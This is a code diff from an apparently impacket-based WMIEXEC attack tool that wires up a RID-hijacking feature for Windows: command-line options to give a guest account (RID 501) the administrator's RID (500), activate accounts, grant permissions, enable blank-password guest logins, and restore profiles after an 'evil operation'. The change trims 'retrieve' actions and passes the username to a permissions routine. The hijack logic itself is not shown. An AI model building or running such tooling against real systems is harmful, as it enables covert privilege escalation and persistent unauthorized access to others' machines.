@@ -182,8 +182,8 @@ class WMIEXEC:
                         RID_Hijack.hijack(self.__options.action, self.__options.user, self.__options.hijack_rid)
                     elif self.__options.action in ['activate', 'deactivate', 'remove'] and all([self.__options.user]):
                         RID_Hijack.hijack(self.__options.action, self.__options.user)
-                    elif self.__options.action in ['grant', 'grant-old', 'retrieve', 'retrieve-old'] and all([self.__options.user]):
-                        RID_Hijack.Permissions_Controller(self.__options.action, self.__options.user)
+                    elif self.__options.action in ['grant', 'grant-old'] and all([self.__options.user]):
+                        RID_Hijack.Permissions_Controller(self.__options.action, self.__options.user, self.__username)
                     elif self.__options.action == "backup" and all([self.__options.user]):
                         RID_Hijack.hijack(self.__options.action, self.__options.user, hostname=addr)
                 elif self.__options.blank_pass_login:
@@ -316,7 +316,7 @@ if __name__ == '__main__':
     rid_HijackParser.add_argument('-query', action='store_true', help="Query all users.")
     rid_HijackParser.add_argument('-user', action='store', help='Specify users RID which you want to playing with.(Like guest user 501)')
     rid_HijackParser.add_argument('-hijack-rid', action='store', help="Specify RID which you want to hijack to.(Like administrator rid 500)")
-    rid_HijackParser.add_argument('-action', action='store', choices=['hijack', 'activate', 'deactivate', 'grant', 'grant-old', 'retrieve', 'retrieve-old', 'backup', 'remove'], help='Action you want to do.')
+    rid_HijackParser.add_argument('-action', action='store', choices=['hijack', 'activate', 'deactivate', 'grant', 'grant-old', 'backup', 'remove'], help='Action you want to do.')
     rid_HijackParser.add_argument('-blank-pass-login', action='store', choices=['enable', 'disable'], help='Enable or disable blank pass login.(for guest user)')
     rid_HijackParser.add_argument('-restore', action='store', help='Restore user profile after you want to do evil operation, need to specify the backup json file)')
 
